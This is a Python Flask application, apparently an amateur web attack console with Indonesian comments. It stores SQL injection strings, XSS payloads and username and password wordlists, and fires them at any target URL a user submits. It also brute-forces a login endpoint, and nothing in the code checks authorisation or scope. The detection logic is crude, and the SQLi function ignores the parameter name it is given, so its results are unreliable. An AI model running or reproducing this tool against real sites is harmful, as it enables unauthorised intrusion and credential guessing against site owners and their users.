from flask import Flask, render_template, request, jsonify
import requests
import urllib.parse
# Import library lain jika diperlukan: from itertools import product

app = Flask(__name__)

# --- GLOBAL/DEFAULT PAYLOADS BANK (The Payload Library) ---
DEFAULT_PAYLOADS = {
    "SQLi": ["' OR '1'='1", "' UNION SELECT 1,2--", "admin'--"],
    "XSS": ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "javascript:alert(1)"],
    "BruteForce_User": ["admin", "user", "root", "administrator", "guest"], # Untuk username
    "BruteForce_Pass": ["password", "123", "qwerty", "secret"] # Untuk password
}

TARGET_URL = "" # Akan di-override oleh request, tapi disimpan sebagai default fallback

# --- Core Attack Functions (Updated to use passed base_url) ---

def test_sqli(base_url, param_name, payloads):
    results = []
    print(f"--- Running SQLi Test on Parameter: {param_name} ---")
    for payload in payloads:
        test_url = f"{base_url}?{urllib.parse.urlencode({'id': payload})}" 
        try:
            response = requests.get(test_url, timeout=10)
            if "Admin" in response.text or (len(response.content) > 500 and response.status_code == 200):
                results.append({"payload": payload, "status": "SUCCESS (Potential Injection)", "data": response.text[:300] + "..."})
            else:
                 results.append({"payload": payload, "status": "FAIL", "data": None})
        except requests.exceptions.RequestException as e:
            results.append({"payload": payload, "status": "ERROR", "data": str(e)})
    return results

def test_xss(base_url, injection_point, payloads):
    results = []
    print(f"--- Running XSS Test on Field: {injection_point} ---")
    for payload in payloads:
        test_url = f"{base_url}?comment={urllib.parse.quote(payload)}" 
        try:
            response = requests.get(test_url, timeout=10)
            if "alert" in response.text and len(response.text) > 500:
                 results.append({"payload": payload, "status": "SUCCESS (Payload Echoed)", "data": f"Script found in output."})
            else:
                results.append({"payload": payload, "status": "FAIL", "data": None})

        except requests.exceptions.RequestException as e:
            results.append({"payload": payload, "status": "ERROR", "data": str(e)})
    return results


def test_bruteforce(base_url, username_list, password_list):
    """Simulates brute-forcing a login endpoint."""
    print("--- Running Brute Force Test ---")
    results = []
    # Dalam dunia nyata, Anda akan loop melalui kombinasi semua pasangan (user, pass)
    for user in username_list:
        for password in password_list:
            # Asumsi endpoint login: ?username=user&password=pass
            login_url = f"{base_url}/admin/login?username={urllib.parse.quote(user)}&password={urllib.parse.quote(password)}" 
            try:
                response = requests.get(login_url, timeout=10)
                # Cek apakah respon mengindikasikan login berhasil (misalnya redirect ke dashboard atau mengandung kata "Welcome")
                if "Dashboard" in response.text or response.status_code == 200 and len(response.content) > 500:
                    results.append({"payload": f"{user}:{password}", "status": "SUCCESS (Potential Credential Found)", "data": f"Access granted at {login_url}"})
                else:
                     results.append({"payload": f"{user}:{password}", "status": "FAIL", "data": None})
            except requests.exceptions.RequestException as e:
                 results.append({"payload": f"{user}:{password}", "status": "ERROR", "data": str(e)})
    return results

# --- Flask Routes (Updated) ---
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/scan', methods=['POST'])
def scan_site():
    data = request.json
    attack_type = data.get('attackType')
    params = data.get('parameters', {})
    target_url = data.get('targetUrl') 

    if not attack_type or not target_url:
        return jsonify({"error": "Please provide a Target URL and select an Attack Type."}), 400

    all_results = []

    # --- LOGIC DISPATCHER berdasarkan tipe serangan ---

    if attack_type == 'SQLi':
        param_to_test = params.get('parameter', 'id')
        payloads = DEFAULT_PAYLOADS['SQLi'] # Menggunakan payload default
        all_results.extend(test_sqli(target_url, param_to_test, payloads))

    elif attack_type == 'XSS':
        injection_point = params.get('field', 'comment')
        payloads = DEFAULT_PAYLOADS['XSS'] # Menggunakan payload default
        all_results.extend(test_xss(target_url, injection_point, payloads))

    elif attack_type == 'BruteForce':
        # Karena ini kompleks (User/Pass), kita ambil dari list yang sudah didefinisikan di sini
        user_list = DEFAULT_PAYLOADS['BruteForce_User']
        pass_list = DEFAULT_PAYLOADS['BruteForce_Pass']
        all_results.extend(test_bruteforce(target_url, user_list, pass_list))

    # Tambahkan kasus lain di sini:
    # elif attack_type == 'DirectoryBrute':
    #     ... (Logika DirectoryBrute)
    #     pass


    return jsonify({"success": True, "results": all_results})


if __name__ == '__main__':
    app.run(debug=True)
